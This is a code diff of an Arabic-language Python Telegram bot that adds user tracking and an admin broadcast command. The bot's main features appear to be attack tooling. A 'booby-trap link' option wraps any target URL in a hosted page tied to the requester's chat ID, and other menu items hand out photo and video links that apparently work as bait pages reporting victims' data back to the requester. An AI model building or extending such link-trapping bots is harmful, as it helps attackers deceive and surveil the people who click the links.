@@ -9,8 +9,7 @@ import yt_dlp
 # إيقاف التحذيرات
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- الإعدادات ---
-BOT_TOKEN = os.getenv("BOT_TOKEN") # استخدم المتغيرات في Railway
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = "8169635171"
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -21,6 +20,18 @@ VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
 IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
 
 user_states = {}
+
+# --- حفظ المستخدمين للإعلان ---
+def save_user(chat_id):
+    try:
+        with open("users.txt", "a") as f:
+            f.write(f"{chat_id}\n")
+    except: pass
+
+def get_users():
+    if not os.path.exists("users.txt"): return []
+    with open("users.txt", "r") as f:
+        return list(set(f.read().splitlines()))
 
 # --- السيرفر للبقاء نشطاً ---
 def run_dummy_server():
@@ -33,11 +44,8 @@ def download_video_sync(url, chat_id):
     try:
         file_path = f'/tmp/vid_{chat_id}.mp4'
         ydl_opts = {
-            'format': 'best',
-            'outtmpl': file_path,
-            'quiet': True,
-            'no_warnings': True,
-            'cookiefile': 'cookies.txt', # تأكد من رفع هذا الملف
+            'format': 'best', 'outtmpl': file_path, 'quiet': True,
+            'no_warnings': True, 'cookiefile': 'cookies.txt',
             'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
             'geo_bypass': True
         }
@@ -45,26 +53,36 @@ def download_video_sync(url, chat_id):
             if os.path.exists(file_path): os.remove(file_path)
             info = ydl.extract_info(url, download=True)
             return file_path, info.get('title', 'Video')
-    except Exception as e: 
-        return None, str(e)
+    except Exception as e: return None, str(e)
 
-# --- القائمة ---
+# --- القائمة (معدلة لتطابق الصورة 118414.jpg) ---
 def get_main_keyboard():
-    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
-        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
         types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
         types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
         types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
         types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
-        types.InlineKeyboardButton("💣 تلغيم رابط", callback_data="inject_start")
+        types.InlineKeyboardButton("💣 تلقيم رابط", callback_data="inject_start"),
+        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link")
     )
     return markup
 
-# --- المعالجات ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.send_message(message.chat.id, "👋 أهلاً بك، تم تحديث البوت:", reply_markup=get_main_keyboard())
+    save_user(message.chat.id)
+    bot.send_message(message.chat.id, "👋 أهلاً بك، تم تحديث البوت.\n\nاختر من القائمة:", reply_markup=get_main_keyboard())
+
+# --- ميزة الإعلان ---
+@bot.message_handler(commands=['announce'])
+def announce(message):
+    if str(message.chat.id) == ADMIN_ID:
+        users = get_users()
+        bot.reply_to(message, f"📢 جاري الإرسال لـ {len(users)} مستخدم...")
+        for uid in users:
+            try: bot.send_message(uid, "📢 إعلان من الإدارة: تم تحديث البوت بنجاح!")
+            except: continue
+        bot.reply_to(message, "✅ تم الإرسال للجميع.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
@@ -88,7 +106,6 @@ def handle_query(call):
 def handle_text(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
-    
     if state == "waiting_for_inject":
         target = message.text if message.text.startswith("http") else f"https://{message.text}"
         bot.reply_to(message, f"✅ تم التلغيم:\n{INJECT_PAGE}?target={target}&chatId={chat_id}")
@@ -100,8 +117,7 @@ def handle_text(message):
             with open(path, 'rb') as v: bot.send_video(chat_id, v, caption=title)
             bot.delete_message(chat_id, status_msg.message_id)
             os.remove(path)
-        else:
-            bot.edit_message_text(f"❌ فشل: تأكد من ملف cookies.txt", chat_id, status_msg.message_id)
+        else: bot.edit_message_text(f"❌ فشل: تأكد من ملف cookies.txt", chat_id, status_msg.message_id)
         user_states[chat_id] = None
 
 if __name__ == '__main__':
